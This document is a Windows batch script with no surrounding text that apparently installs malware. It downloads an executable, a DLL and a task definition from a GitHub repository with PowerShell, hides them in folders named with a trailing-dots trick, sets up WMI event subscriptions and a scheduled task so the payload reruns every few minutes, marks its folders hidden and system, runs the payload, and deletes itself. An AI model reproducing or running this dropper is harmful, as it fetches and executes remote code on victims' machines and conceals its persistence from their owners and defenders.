@echo off
schtasks /Delete /TN "\DirectUpdate" /F
schtasks /Delete /TN "\UpdateDirect" /F
taskkill /f /IM WmiPrv.exe /t
attrib -h -s -r C:\ProgramData\Packag /d /s
rd \\.\C:\ProgramData\Package..\ /S /Q
rd C:\ProgramData\Packag /S /Q 
powershell.exe iwr -Uri https://github.com/foxsbug/foxsbug/raw/main/FoxsUpdate.xml -OutFile C:\ProgramData\FoxsUpdate.xml
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="pers"' DELETE
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="per"' DELETE
mkdir C:\ProgramData\Dackag
mkdir \\.\C:\ProgramData\Dackage..\
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Dackage..\WmiPrv.exe C:\ProgramData\Dackage..\utshellext.dll", CommandLineTemplate="C:\ProgramData\Dackage..\WmiPrv.exe C:\ProgramData\Dackage..\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="pers"", Consumer="CommandLineEventConsumer.Name="pers""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="per", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 660 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="per", CommandLineTemplate="C:\ProgramData\Dackag\WmiPrv.exe C:\ProgramData\Dackag\utshellext.dll", CommandLineTemplate="C:\ProgramData\Dackag\WmiPrv.exe C:\ProgramData\Dackag\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="per"", Consumer="CommandLineEventConsumer.Name="per""
schtasks /create /xml "C:\ProgramData\FoxsUpdate.xml" /tn "\FoxsUpdate"
powershell.exe iwr -Uri https://github.com/foxsbug/foxsbug/raw/main/WmiPrv.exe -OutFile C:\ProgramData\Dackag\WmiPrv.exe
powershell.exe iwr -Uri https://github.com/foxsbug/foxsbug/raw/main/utshellext.dll -OutFile C:\ProgramData\Dackag\utshellext.dll
copy C:\ProgramData\Dackag\WmiPrv.exe \\.\C:\ProgramData\Dackage..\WmiPrv.exe
copy C:\ProgramData\Dackag\utshellext.dll \\.\C:\ProgramData\Dackage..\utshellext.dll
attrib +h +s +r C:\ProgramData\Dackag
del /S /Q C:\ProgramData\FoxsUpdate.xml
C:\ProgramData\Dackag\WmiPrv.exe C:\ProgramData\Dackag\utshellext.dll
del/a/f "%~f0"